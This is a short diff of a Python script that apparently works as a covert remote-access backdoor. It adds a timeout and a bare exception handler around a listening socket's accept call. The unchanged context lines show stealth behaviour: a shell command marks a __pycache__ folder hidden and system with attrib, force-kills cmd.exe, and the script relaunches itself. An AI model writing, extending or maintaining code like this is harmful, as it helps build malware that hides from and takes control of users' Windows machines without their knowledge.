@@ -132,6 +132,7 @@ while run == True:
     s.close()
     
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.settimeout(120)
     if ossys == True:
         print("reload")
         os.system(getFileName())
@@ -147,7 +148,10 @@ while run == True:
             temp = 1
     if temp == 0:
         subprocess.Popen("cd "+getpath(True)+"& attrib +h +s __pycache__ & taskkill /im cmd.exe /F", shell=True)
-    (client, address) = server.accept()
+    try:
+        (client, address) = server.accept()
+    except:
+        sortir = True
     print("connect")
 
     while sortir == False and run == True:
